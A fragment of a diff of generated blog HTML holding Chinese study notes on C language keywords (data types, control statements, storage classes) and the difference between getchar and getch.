 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">auto ：声明自动变量 一般不使用</span><br><span class="line">extern：声明变量是在其他文件正声明（也可以看做是引用变量）</span><br><span class="line">register：声明积存器变量</span><br><span class="line">static ：声明静态变量</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getchar ()和getch()的区别；</span><br><span class="line">1.getchar();从键盘读取一个字符并输出，该函数的返回值是输入第一个字符的ASCII码；若用户输入的是一连串字符，函数直到用户输入回车时结束，输入的字符连同回车一起存入键盘缓冲区。若程序中有后继的getchar();函数，则直接从缓冲区逐个读取已输入的字符并输出，直到缓冲区为空时才重新读取用户的键盘输入。</span><br><span class="line">2.getch();接受一个任意键的输入，不用按回车就返回。该函数的返回值是所输入字符的ASCII码，且该函数的输入不会自动显示在屏幕上，需要putchar();函数输出显示。getch();函数常用于中途暂停程序方便调试和查看</span><br></pre></td></tr></table></figure>
-
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/11/13/%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5/" data-id="cl1a5wq3l000augtddd92bhxl" data-title="常见关键字" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/11/13/%E5%B8%B8%E8%A7%81%E8%AF%AD%E5%8F%A5/" data-id="cl1dk77jq000944td5w0zd2r8" data-title="常见关键字" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-常见关键字" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/11/13/%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97/" class="article-date">
+  <time class="dt-published" datetime="2021-11-13T01:57:26.000Z" itemprop="datePublished">2021-11-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/11/13/%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97/">常见关键字</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一.数据类型关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char ：声明字符型变量或函数</span><br><span class="line">double ：声明双精度变量或函数</span><br><span class="line">float：声明浮点型变量或函数</span><br><span class="line">int： 声明整型变量或函数</span><br><span class="line">long ：声明长整型变量或函数</span><br><span class="line">short ：声明短整型变量或函数</span><br><span class="line">unsigned：声明无符号类型变量或函数</span><br><span class="line">void ：声明函数无返回值或无参数，声明无类型指针（基本上就这三个作用）</span><br><span class="line">enum ：声明枚举类型</span><br><span class="line">signed：声明有符号类型变量或函数</span><br><span class="line">struct：声明结构体变量或函数</span><br><span class="line">union：声明共用体（联合）数据类型</span><br></pre></td></tr></table></figure>
+<p>二.控制语句和关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">控制语句</span><br><span class="line">goto语句:      无条件转向</span><br><span class="line">if语句:        判断语句</span><br><span class="line">while语句：    循环</span><br><span class="line">do-while语句:  先执行循环体,然后判断循环条件是否成立. 之后继续循环</span><br><span class="line">for语句:        循环,可替代while语句，只是用法不太一样</span><br><span class="line">break语句：     跳出本层的循环(只跳出包含此语句的循环)</span><br><span class="line">continue语句:   继续，一般放到循环语句里,不在执行它下面的语句,直接跳到判断语句</span><br><span class="line">                eg:for语句,就直接跳到第二个分号处,while语句,就直接跳到while()的括号里</span><br><span class="line">switch语句:     多相选择</span><br><span class="line">return语句:     返回</span><br><span class="line">1.循环语句</span><br><span class="line">        for：一种循环语句(可意会不可言传）</span><br><span class="line">        do ：循环语句的循环体</span><br><span class="line">        while ：循环语句的循环条件</span><br><span class="line">        break：跳出当前循环</span><br><span class="line">        continue：结束当前循环，开始下一轮循环</span><br><span class="line">2.条件语句</span><br><span class="line">        if: 条件语句</span><br><span class="line">        else ：条件语句否定分支（与 if 连用）</span><br><span class="line">        goto：无条件跳转语句</span><br><span class="line">3.开关语句</span><br><span class="line">        switch :用于开关语句</span><br><span class="line">        case：开关语句分支</span><br><span class="line">        default：开关语句中的“其他”分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>三、存储类型关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auto ：声明自动变量 一般不使用</span><br><span class="line">extern：声明变量是在其他文件正声明（也可以看做是引用变量）</span><br><span class="line">register：声明积存器变量</span><br><span class="line">static ：声明静态变量</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/11/13/%E5%B8%B8%E8%A7%81%E5%85%B3%E9%94%AE%E5%AD%97/" data-id="cl1dk77jq000a44td832w64ae" data-title="常见关键字" class="article-share-link">Share</a>
       
       
       
